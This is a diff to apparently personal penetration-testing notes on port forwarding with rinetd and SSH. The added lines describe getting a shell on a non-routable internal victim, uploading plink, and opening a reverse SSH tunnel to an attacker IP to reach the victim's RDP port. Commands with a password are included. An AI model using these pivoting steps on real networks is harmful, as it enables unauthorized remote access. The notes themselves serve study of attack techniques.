@@ -93,22 +93,42 @@ Bindaddress    Bindport    ConnectAddress    Connectport
 /etc/init.d/rinetd start
 ```
 
+Windows machine  \(Internal\) -------&gt; Linux Machine \(Proxy machine\) ------&gt;  Windows Machine \(Remote\)
+
+      RDP - 208.88.127.99:80                     208.88.127.99                                       67.23.72.109:3389
+
+
+
 Encrypted tunnel within the ssh tunnel:
 
-SSH Local Port forwarding \(-l\):
+**SSH Local Port forwarding \(-L\):**
 
 localport --&gt; remoteport \(Over ssh tunnel\)
 
-Scenario2:
+**SSH Remote Port forwarding :**
 
-Initiated Client Attack \(on org\) and got shell of a internal machine \(Non routable\) -- &gt; uploaded a SSH windows client \(plink\) on vi 
+Scenario2\(tunnel a remote port to a local server\):
+
+Initiated Client Attack \(on org\) and got shell of a internal machine \(Non routable\) -- &gt; uploaded a SSH windows client \(plink\) on vi
 
 on victim machine we have RDP enabled \(\)
+
+now to access internal RDP port by creating reverse SSL connection to attacker machine from the victim machine
 
 Now tunnel the local rdp traffic to the remote port using plink
 
 ```
 plink -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389
+```
+
+ssh connection is made and 3390 is in listen mode 
+
+netstat -antp \| grep LISTEN
+
+Now in attacker machine try to tunnel the local traffic to rdp
+
+```
+rdesktop 127.0.0.1:3390
 ```
 
 
